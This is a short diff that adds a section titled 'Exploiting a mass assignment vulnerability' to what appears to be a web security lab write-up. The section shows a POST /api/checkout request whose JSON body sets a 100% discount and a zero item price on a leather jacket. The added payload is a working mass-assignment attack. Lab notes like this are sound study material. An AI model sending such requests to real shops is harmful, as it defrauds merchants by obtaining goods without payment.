@@ -40,3 +40,23 @@ Add Content-Type: application/json
 }
 ```
 
+# Exploiting a mass assignment vulnerability
+
+POST /api/checkout
+
+```json
+{
+  "chosen_discount": {
+    "percentage": 100
+  },
+  "chosen_products": [
+    {
+      "product_id": "1",
+      "name": "Lightweight \"l33t\" Leather Jacket",
+      "quantity": 1,
+      "item_price": 0
+    }
+  ]
+}
+
+```
